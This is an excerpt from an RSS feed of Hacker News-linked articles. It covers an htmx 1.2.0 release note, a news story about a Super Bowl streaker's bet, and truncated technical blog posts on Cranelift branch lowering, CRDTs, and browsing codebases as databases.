            <pubDate>Sun, 14 Feb 2021 02:20:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Htmx 1.2.0 Release]]>
            </title>
            <description>
<![CDATA[
Score 116 | Comments 18 (<a href="https://news.ycombinator.com/item?id=26128229">thread link</a>) | @crbelaus
<br/>
February 13, 2021 | https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/ | <a href="https://web.archive.org/web/*/https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <h2>htmx 1.2.0 Release</h2>
<p>I'm happy to announce the <a href="https://unpkg.com/browse/htmx.org@1.2.0/">1.2.0 release</a> of htmx.</p>
<h3>New Features &amp; Major Changes</h3>
<ul>
<li><code>hx-vars</code> has been deprecated in favor of <code>hx-vals</code></li>
<li><code>hx-vals</code> now supports a <code>javascript:</code> prefix to achieve the behavior that <code>hx-vars</code> provided</li>
<li>The new <code>hx-headers</code> attribute allows you to add headers to a request via an attribute.  Like <code>hx-vals</code> it supports
JSON or javascript via the <code>javascript:</code> prefix</li>
<li><code>hx-include</code> will now include all inputs under an element, even if that element is not a form tag</li>
<li>The <a href="https://htmx.org/extensions/preload/">preload extension</a> now offers a <code>preload-images="true"</code> attribute that will aggressively load images in preloaded content</li>
<li>On requests driven by a history cache miss, the new <code>HX-History-Restore-Request</code> header is included so that the server
can differentiate between history requests and normal requests</li>
</ul>
<h3>Improvements &amp; Bug fixes</h3>
<ul>
<li>Improved handling of precedence of input values to favor the enclosing form (see <a href="https://github.com/bigskysoftware/htmx/commit/a10e43d619dc340aa324d37772c06a69a2f47ec9">here</a>)</li>
<li>Moved event filtering logic <em>after</em> <code>preventDefault</code> so filtering still allows events to be properly handled</li>
<li>No longer trigger after swap events on elements that have been removed via an <code>outerHTML</code> swap</li>
<li>Properly remove event handlers added to other elements when an element is removed from the DOM</li>
<li>Handle the <code>scroll:</code> modifier in <code>hx-swap</code> properly when an <code>outerHTML</code> swap occurs</li>
<li>Lots of docs fixes</li>
</ul>
<p>Enjoy!</p>

</div></div>]]>
            </description>
            <link>https://htmx.org/posts/2021-2-13-htmx-1.2.0-is-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128229</guid>
            <pubDate>Sat, 13 Feb 2021 23:51:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Super Bowl streaker says he bet $50k on his stunt]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26128093">thread link</a>) | @aaron695
<br/>
February 13, 2021 | https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt80889749read"><div data-den="denmark"><div><ul><li>Super Bowl streaker Yuri Andrade made a splash Sunday at Raymond James Stadium in Tampa, Florida.</li><li>After his streaking stunt, Andrade said he had bet $50,000 that a streaker would take the field.</li><li>Now it looks as though Andrade won't be cashing in on his bets because he keeps talking about it.</li></ul><p data-pos="3">With just over five minutes remaining in Super Bowl LV, <a target="_blank" href="https://www.insider.com/video-fan-storms-super-bowl-field-great-run-2021-2" rel="nofollow">a fan ran onto the field</a>, briefly disrupting the Tampa Bay Buccaneers' march to victory over the Kansas City Chiefs.</p><p data-pos="4">Later identified as Yuri Andrade, the fan had a pretty successful run as far as streakers go. He made it onto the field, got some photos taken of himself in a hot-pink one-piece emblazoned with the name of an adult website, and evaded security long enough to interrupt the game. He even got <a target="_blank" href="https://www.insider.com/kevin-harlan-super-bowl-streaker-be-a-man-2021-2" rel="nofollow">a fantastic call from the legendary play-by-play man Kevin Harlan</a>, who was broadcasting the game over the radio.</p><p>But after his stunt, reports began coming out that Andrade's run had been even more successful than initially thought. Andrade had not only made it onto the field but also claimed to have done so after placing a $50,000 wager that the Super Bowl would have a streaker, which would bring in $374,000 in winnings.</p><blockquote><div> <p data-pos="5">A post shared by Yuri andrade (@kingyuri)<time datetime=""></time></p></div></blockquote><p>Andrade's claim immediately raised eyebrows in the betting community. Patrick Everson of Covers said on Twitter that offshore sportsbooks likely would have had limits in place to prevent such a bet from being made.</p><blockquote data-lang="en" data-cards="" data-conversation="">—Patrick Everson  (@Covers_Vegas) <a target="_blank" href="https://twitter.com/mims/statuses/1358976651061653505?ref_src=twsrc%5Etfw" rel="nofollow">February 9, 2021</a></blockquote><p data-pos="9">Todd Fuhrman of the "Bet the Board" podcast also had questions about Andrade's wager, as he had initially told TMZ Sports that he sent someone to Las Vegas to make the wager. Since placing bets on off-field events isn't allowed at Vegas sportsbooks, the story immediately seemed phony.</p><blockquote data-lang="en" data-cards="" data-conversation="">—Todd Fuhrman  (@ToddFuhrman) <a target="_blank" href="https://twitter.com/mims/statuses/1359373081475620865?ref_src=twsrc%5Etfw" rel="nofollow">February 10, 2021</a></blockquote><p>But despite initial suspicions, it appears that there was some truth to Andrade's claim, though he still won't be cashing in on his run.</p><p><span>Advertisement</span></p><figure><div></div></figure><hr><p data-pos="12">Andrade <a target="_blank" href="https://theathletic.com/2378461/2021/02/11/super-bowl-streakers-motives-latest-arrest-follows-a-long-history-of-problems/" rel="nofollow">told a Tampa radio station</a> that he had gotten friends to place wagers from different accounts on the gambling site Bovada. They bet that there would be a fan on the field at +750 odds. With several smaller wagers rather than one big $50,000, it's more conceivable that Andrade could have gotten a healthy wager down on his run.</p><p>According to a report <a target="_blank" href="https://frontofficesports.com/offshore-sportsbook-voids-bets-linked-to-super-bowl-streaker/" rel="nofollow">from A.J. Perez at Front Office Sports</a>, Bovada was working to identify accounts that knew of Andrade's planned stunt."Our players have always trusted us to ensure the integrity of all props offered in our sportsbook," a Bovada spokesman told Perez. "We will continue to make sure that any publicity stunts or ill-intended behavior cannot adversely affect the outcome of a player's wager."</p><p data-pos="15">According to Perez, Bovada is refunding those that wagered there would not be a fan on the field during the game and paying out winning bets for accounts that were not linked to early knowledge of Andrade's plan. Perez wrote that one bettor who said he had no prior knowledge of the stunt had already had his account shut down by Bovada.</p><p data-pos="16">Ultimately, it looks as though Andrade's plan to bet on himself won't end up in the big payday that he had hoped for, but it appears he came closer to success than many initially suspected.</p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/sports/news/super-bowl-streaker-says-he-bet-50000-on-his-stunt-but-his-plan-is-falling-apart-because-he-couldnt-keep-his-mouth-shut/articleshow/80889749.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-26128093</guid>
            <pubDate>Sat, 13 Feb 2021 23:33:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cranelift, Part 2: Compiler Efficiency, CFGs, and a Branch Peephole Optimizer]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127665">thread link</a>) | @PoignardAzur
<br/>
February 13, 2021 | https://cfallin.org/blog/2021/01/22/cranelift-isel-2/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the second in a three-part series about
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>.
In the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">first post</a>, I
described the context around Cranelift and our project to replace its
backend code-generation infrastructure, and detailed the
instruction-selection problem and how we solve it. The remaining two
posts will be deep-dives into some interesting engineering problems.</p>

<p>In this post, I want to dive into the <em>compiler performance</em> aspect of
our work more deeply. (In the next post we’ll explore correctness.)
There are many interesting aspects of compilation speed I could talk
about, but one particularly difficult problem is the handling of
<em>control flow</em>: how do we translate structured control flow at the
Wasm level into control-flow graphs at the IR level, and finally to
branches in a linear stream of instructions at the machine-code level?</p>

<p>Doing this translation efficiently requires careful attention to the
overall pass structure, with the largest wins coming when one can
completely eliminate a category of work. We’ll see this in how we
combine several passes in a traditional lowering design (critical-edge
splitting, block ordering, redundant-block elimination, branch
relaxation, branch target resolution) into <em>inline transforms</em> that
happen during other passes (lowering of the CLIF, or Cranelift IR,
into machine-specific IR; and later, binary emission).</p>

<p>This post basically describes the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/buffer.rs"><code>MachBuffer</code></a>,
a “smart machine-code buffer” that knows about branches and edits them
on-the-fly as we emit them, and the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/blockorder.rs"><code>BlockLoweringOrder</code></a>,
which allows us to lower code in final basic-block order, with split
critical edges inserted implicitly, by traversing a never-materialized
implicit graph. The work was done mostly in <a href="https://github.com/bytecodealliance/wasmtime/pull/1718">Cranelift PR
#1718</a>, which
resulted in a ~10% compile-time improvement and a ~25%
compile+run-time improvement on a CPU-intensive benchmark (<code>bz2</code>).</p>

<h2 id="control-flow-graphs">Control-Flow Graphs</h2>

<p>Before we discuss any of that, we need to review control-flow graphs
(CFGs)! The CFG is a fundamental data structure used in almost all
modern compilers. In brief, it represents how execution (i.e., program
control) may flow through instructions, using graph nodes to represent
linear sequences of instructions and graph edges to represent all
possible control-flow transfers at branch instructions.</p>

<p>At the end of the instruction selection process, which we learned
about in the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">previous post</a>, we have a function body lowered into VCode that consists of
<a href="https://en.wikipedia.org/wiki/Basic_block"><em>basic blocks</em></a>. A basic
block is a contiguous sequence of instructions that has no outbound
branches except at the end, and has no inbound branches except at the
beginning. In other words, it is “straight-line” code: execution
always starts at the top and proceeds to the end. An example
control-flow graph (CFG) consisting of four basic blocks is shown
below:</p>

<p><img src="https://cfallin.org/assets/2020-10-08-cfg-web.svg" alt="Figure: Control-flow graph with four basic blocks in a diamond"></p>

<p>Control-flow graphs are excellent data structures for compilers to
use. By making the flow of execution explicit as graph edges, rather
than reasoning about instructions in order in memory as the processor
sees them, many analyses can be performed more easily. For example,
<a href="https://en.wikipedia.org/wiki/Data-flow_analysis">dataflow analysis</a>
problems can be solved easily because the CFG makes traversal of
possible control-flow transfers easy. Graph-based representations of
the program also allow easier <em>moving and insertion of code</em>: it is
less error-prone to manipulate an explicit graph than to reason about
implicit control-flow (e.g. fallthrough from a not-taken conditional
branch). Finally, the graph representation factors out the question of
<em>block ordering</em>, which can be important for performance; we can
address this problem separately by choosing how we serialize the graph
nodes (blocks). For these reasons, most compiler IRs, including
Cranelift’s CLIF and <code>VCode</code>, are CFG-based.</p>

<p>(Historical note: control-flow graphs were invented by the late
<a href="https://en.wikipedia.org/wiki/Frances_Allen">Frances Allen</a>, who
largely established the algorithmic foundations that modern compilers
use. Her paper <a href="https://www.clear.rice.edu/comp512/Lectures/Papers/1971-allen-catalog.pdf">A catalogue of optimizing
transformations</a><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
covers essentially all of the important optimizations used today and
is well worth a read.)</p>

<h2 id="cpus-and-branch-instructions">CPUs and Branch Instructions</h2>

<p>To represent a CFG’s end-of-block branches at the instruction level,
we can use <em>two-way branches</em>: these are instructions that branch
either to one basic-block target if some condition is true, or another
if the condition is false. (Basic blocks can also end in simple
unconditional single-target branches.) We wrote such a branch as <code>if
r0, L1, L2</code> above; this means that the block <code>L0</code> will be followed in
execution either by <code>L1</code> or <code>L2</code>, depending on the value in <code>r0</code>.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<h3 id="branches-with-fallthrough">Branches with Fallthrough</h3>

<p>However, CPUs rarely have such two-way branch instructions. Instead,
conditional control-flow in common ISAs is almost always provided with
a <em>conditional branch with fallthrough</em>. This is an instruction that,
if some condition is true, branches to another location; otherwise,
does nothing, and allows execution to continue sequentially. This is a
better fit for a hardware implementation for a number of reasons: it’s
easier to encode one target than two (the destination of the jump
might be quite far away for some branches, and instructions have
limited bits available), and it’s usually the case that the compiler
can place one of the successor blocks immediately afterward anyway.</p>

<p>Now, this isn’t much of a problem if we just want a working compiler;
instead of a two-way branch</p>



<p>We can write a sequence of branches</p>



<p>where <code>br_if</code> branches to <code>L1</code> or falls through to the unconditional
<code>goto</code>. But this is not so efficient in many cases. Consider what
would happen if we laid out basic blocks in the order <code>L0</code>, <code>L2</code>,
<code>L1</code>, <code>L3</code>:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      goto L2
    L2:
      ...
      goto L3
    L1:
      ...
      goto L3
    L3:
      ...
      return
</code></pre></div></div>

<p>There are two redundant unconditional branches (<code>goto</code> instructions),
each of which uselessly branches to the following instruction. We can
remove both of them with no ill effects, taking advantage instead of
<em>fallthrough</em>, or allowing execution to proceed directly from the end
of one block to the start of the next one:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      // ** Otherwise, fall through to L2 **
    L2:
      ...
      goto L3
    L1:
      ...
      // ** Always fall through to L3 **
    L3:
      ...
      return
</code></pre></div></div>

<p>This seems like an easy enough problem to solve: we just need to
recognize when a branch is redundant and remove it, right? Well, yes,
but we can do much better than that in some cases; we’ll dig into this
problem in significantly more depth below!</p>

<h3 id="machine-code-encoding-branch-offsets">Machine-code Encoding: Branch Offsets</h3>

<p>So far, we’ve written our machine instructions in a way that humans
can read, using <em>labels</em> to refer to locations in the instruction
stream. At the hardware level, however, these labels do not exist;
instead, the machine code branches contain target <em>addresses</em> (usually
encoded as relative <em>offsets</em> from the branch instruction). In other
words, we do not see <code>goto L3</code>, but rather <code>goto +32</code>.</p>

<p>This gives rise to several complications when emitting machine code
from a list of instruction <code>struct</code>s.  At the most basic level, we
have to resolve labels to offsets and then patch the branches
appropriately. This is analogous to (but at a lower level than) the
job of a <a href="https://en.wikipedia.org/wiki/Linker_(computing)">linker</a>:
we resolve symbols to concrete values after deciding placement, and
then edit the code according to <em>relocations</em> to refer to those
symbols. In other words, whenever we emit a branch, we make a note (a
relocation, or “label use” in our <code>MachBackend</code>) to go back later and
patch it with the resolved label offset.</p>

<p>The second, and more interesting, problem arises because not all
branch instructions can necessarily refer to all possible labels! As a
concrete example, on AArch64, conditional branches have a ±1 MB range,
and unconditional branches have a ±128 MB range. This arises out of
instruction-encoding considerations: particularly in
fixed-instruction-size ISAs (such as ARM, MIPS, and RISC V), less than
a full machine word of bits are available for the immediate jump
offset that is embedded in the instruction word. (The instruction
itself is always a machine-word wide, and we need some bits for the
opcode and condition code too!) On x86, we have limits for a different
reason: the variable-width encoding allows either a one-byte offset
(allowing a ±128 byte range) or four-byte offset (allowing a ±2 GB
range).</p>

<p>To make a branch to a far-off label, then, on some machines we need to
either use a different sort of branch than the default choice for the
instruction selector, or we need to use a form of <em>indirection</em>, by
targetting the original branch to <em>another branch</em>, the latter in a
special form. The former is tricky because we do not know whether a
target will be in-range until all code is lowered and placement is
computed; so we need to either optimistically or pessimistically lower
branches to the shortest or longest form (respectively) and possibly
switch later. To make matters worse, as we edit branches to use a
shorter or longer form, their length may change, moving <em>other</em>
targets into or out of range; in the most general solution, this is a
“fixpoint problem”, where we iterate until no more changes occur.</p>

<h2 id="challenges-in-lowering-cfgs-to-machine-code">Challenges in Lowering CFGs to Machine Code</h2>

<p>So far, we have a way to produce <em>correct</em> machine code. To emit the
final code for a two-target branch, we can emit a conditional-
followed by unconditional-branch machine instruction. To resolve
branch targets correctly, we can assume that any target could be
anywhere in memory, and always use the long form of a branch; then we
just need to come back in one final pass and fill in the offsets when
we know them.</p>

<p>We can do much better than this, though! Below I’ll describe four
problems and the ways that they are traditionally solved.</p>

<h3 id="problem-1-efficient-use-of-fallthroughs">Problem 1: Efficient use of Fallthroughs</h3>

<p>We described above how <em>branch fallthroughs</em> allow us to omit some
some unconditional branches once we know for sure the order that basic
blocks will appear in the final binary. In …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127665</guid>
            <pubDate>Sat, 13 Feb 2021 22:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 72 | Comments 5 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! 😊</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again—and it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn’t want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn’t have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a “pick the correct revision” dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing “sync debt”. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the “PhD Test”. That is to say, one shouldn’t need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with—background cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions—were all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn’t the issue, since getting data from one device to another was essentially a solved problem. It’s what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you’d be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn’t be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren’t just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved—perhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?—then a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn’t even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple’s servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn’t just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I’d be able to implement sync and collaboration in my apps over CloudKit while using Apple’s first-party sharing UI—all without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here’s a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (“devices”, “peers”) operating in parallel, each one producing <em>operations</em> (“events”, “actions”) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can’t always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation’s <em>caus…</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Database Inside Your Codebase]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127428">thread link</a>) | @todsacerdoti
<br/>
February 13, 2021 | https://feifan.blog/posts/the-database-inside-your-codebase | <a href="https://web.archive.org/web/*/https://feifan.blog/posts/the-database-inside-your-codebase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<div>
  <article>
    
      <p><img src="https://files.tanagram.app/file/tanagram-data/prod-feifans-blog/joshua-sortino-LqKhnDzSF-8-unsplash.jpg">
      </p>
<p>
Navigating codebases of any meaningful size is difficult. Most of a programmer’s time is spent jumping through the codebase, reading or skimming to build a mental model of the constructs and conventions within it. These constructs — among them: the DSLs, interfaces, and taxonomy of types that exist — are arguably the most important precursor to understanding where and how to make changes. But these constructs only exist in programmers’ heads. It’s difficult or impossible to navigate most codebases through the lens of those constructs; programmers lack “code browsers” that present the underlying code independently of files and the filesystem hierarchy. Yet code browsers that can do so — and we’ll look at some examples below — would be incredibly useful. This is because instances of these constructs can be thought of as records in a database, albeit an ad-hoc, poorly-specified database that can only be queried through carefully-crafted regexes<a href="#fn:1" id="fnref:1" title="see footnote">1</a>.</p>
<p>
In simple cases, some constructs manifest as naming conventions: prefixes in a name may be a rudimentary way to namespace classes<a href="#fn:2" id="fnref:2" title="see footnote">2</a>, while suffixes may be a rudimentary way to group classes or identify their type<a href="#fn:3" id="fnref:3" title="see footnote">3</a>. But these are easy examples; many patterns are much more subtle.</p>
<h2>
“Where is this used?”</h2>
<p>
Imagine figuring out “where is this used?”, for various types of “this”:</p>
<p>
Most code editors (perhaps paired with a <a href="https://microsoft.github.io/language-server-protocol/">language server</a>) can show you where local variables are used. This usually also works for finding where methods are invoked — although perhaps less reliably in dynamic-dispatch languages, or languages without types.</p>
<p>
What if you want to find where instances of a particular model get created? There may be multiple ways to create a model, so this isn’t super simple. In Rails, for example, there’s two built-in ways to create a model: you can either call <code>.new</code> to create a new instance in memory followed by <code>.save</code> to persist it to the database, or call <code>.create</code> to automatically do both. Your particular codebase might have additional wrappers for doing this that you’re supposed to use. Even worse, imagine that sometimes you create a <code>.new</code> instance, then set some properties on it over the next few lines, then finally call <code>.save</code>. Something like this:</p>
<pre><code>user = User.new
user.email = '<a href="https://feifan.blog/cdn-cgi/l/email-protection" data-cfemail="5a323f3636351a3f223b372a363f74393537">[email&nbsp;protected]</a>' unless self.anonymous?
user.save</code></pre>
<p>
Conceptually, that’s still code that creates an instance of a particular model. But with the intervening syntax, this would be a difficult case to find with <code>grep</code>.</p>
<h2>
Static config</h2>
<p>
At <a href="https://stripe.com/">Stripe</a>, where I work, we have a lot of code for jobs that need to run at certain times each day. For example, we might need to move funds from one financial partner to another at noon UTC each day. Each of these jobs has configuration code describing when and how it should be run, implemented as a <a href="https://www.jetbrains.com/mps/concepts/domain-specific-languages/">DSL</a>. This config might look something like this:</p>
<pre><code>run_config RunConfig.new(
  job_name: 'partner-daily-funding',
  env_vars: self.config_env,
  cron: RunConfig::Cron.new(
    schedule: { hour: 12, minute: 0 }
  ),
  owning_team: Company::Team::Liquidity
)</code></pre>
<p>
In our codebase, we have hundreds of these jobs, each with their own <code>run_config</code>. If you look at this codebase as a database, you can imagine these jobs being rows in a <code>jobs</code> table, where the fields on each row correspond to the parameters provided to the <code>RunConfig</code> class. </p>
<p>
Wouldn’t it be great to be able to browse all these jobs in a table? Maybe you could perform some basic operations on this data: searching for specific jobs by name or owning team; sorting by the time-of-day they’re scheduled to run; filtering for jobs owned by your team that have errored in the past week. Maybe you could edit the <code>run_config</code> from that interface (like you might edit a spreadsheet) and have it automatically make the corresponding change in the source code (or open a PR). Maybe you could even compute some aggregations on this data — for example, if you’re introducing a new job that requires some expensive computation, maybe you’d like to know which hours have the fewest other jobs scheduled. And of course, this job browser should be bidirectional with respect to the codebase — there should be a button beside each entry that shows the code for the job inline or opens the corresponding code in your editor.</p>
<h2>
Diffused concepts</h2>
<p>
Codebases typically contain logical concepts that are implemented across multiple pieces of code. This is often the case when you need to create multiple files to implement a particular feature.</p>
<p>
For example, in Rails, a “resource” is collectively implemented across a line in the router, a model file, a controller file, and a bunch of view files. Rails even ships with a code generator to <a href="https://github.com/rails/rails/blob/5f3ff60084ab5d5921ca3499814e4697f8350ee7/railties/lib/rails/generators/rails/resource/USAGE">create some of these files</a> for you. But despite resources being a core concept when working with Rails, there’s no good way to browse the resources in your codebase<a href="#fn:4" id="fnref:4" title="see footnote">4</a>. There’s no good way to filter or query your codebase either — you can’t, for example, see which resources support JSON vs XML params. </p>
<p>
